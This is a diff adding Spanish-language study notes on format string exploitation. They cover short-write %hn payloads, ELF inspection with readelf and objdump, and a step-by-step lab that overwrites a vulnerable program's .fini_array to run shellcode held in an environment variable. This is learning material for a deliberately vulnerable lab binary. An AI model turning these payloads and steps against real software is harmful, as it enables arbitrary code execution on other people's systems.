@@ -235,9 +235,51 @@
    indicado por "n$". Eso hace innecesaros los "JUNK" y los "%100x" entre las address para ir aumentando
    los bytes escritos
 
+   Este metodo simplifica el proceso de escribir en una posicion de memoria arbitraria y achica el size
+   necesario del format string.
 
-    
+   ~$ ./fmt_vuln $(perl -e 'print "\xd0\x98\x04\x08"."\xd2\x98\x04\x08"')'%49143x%5$hn%15731x%4$hn' ~
+   Este ejemplo emplea "short writes" para conseguir el mismo resultado con solo 33 bytes.
+   "short write" consiste en agregarle "h" como prefix para los formatos d, x, n, etc., haciendo que impriman
+   o escriban media palabra (2 bytes). 
+
 
     
       
+** CTORS & DTORS (info del binario)
+   Los siguientes son ejemplos de programas y opciones para obtener info de un ELF file.
+   "executable & linkable file" es un formato estandar de archivo que contiene la informacion necesaria
+   para hacer de un binario algo linkeable con otros modulos y ejecutable. Describes how to create a 
+   process/memory image for runtime execution.
+   
 
+   + file /bin/ps :: info general sobre el tipo de archivo
+   + readelf -h|--file-header :: muestra el header del archivo elf
+   + readelf -l|--program-headers|--segments :: info sobre los segmentos. el kernel los usa para mapear la 
+	memoria virtual, usando el syscall mmap(2).
+   + ldd /bin/ps :: normalmente los binarios son "dinamicos" (en lugar de "estaticos") y usan componentes
+		    externos para funcionar, como por ejemplo librerias.
+   + readelf -S|--section-headers|--sections :: info sobre las secciones (.text, .data, .bss, .rodata)
+   + objdump -s -j .fini_array /bin/ps :: ver la seccion .fini_array
+	
+   Para ver esta explicacion en mas detalle ver [[https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/][The 101 of ELF Binaries]].
+
+*** Ejemplo
+    Los siguientes pasos muestran como utilizar un programa vulnerable para ejecutar shellcode:
+    1) objdump -h fmt_vuln | grep '.fini_array'  
+    2) ./getenvaddr SHELLCODE ./fmt_vuln
+    3) gdb -q --batch -ex 'p 0xbfff - 8'
+    4) gdb -q --batch -ex 'p 0xf65f - 0xbfff'
+    5) ./fmt_vuln $(perl -e 'print "\xac\x97\x04\x08\xae\x97\x04\x08"')'%49143x%5$hn%13920x%4$hn'
+
+    En los puntos *1 y 2* se ve en que posiciones de memoria van a ubicarse: *1* la tabla ".fini_array", 
+    que es una lista de direcciones de las funciones encargadas de la finalizacion del programa; y en *2*
+    la variable de entorno "SHELLCODE" (que contiene el codigo a ejecutar).
+
+    En los puntos *3 y 4* se calculan los bytes a escribir con el *printf* vulnerable para fabricar el valor
+    que queremos escribir en la tabla ".fini_array".
+
+    En el punto *5* ejecutamos el progama con un argumento preparado para aprovechar el printf vulnerable.
+
+    
+       
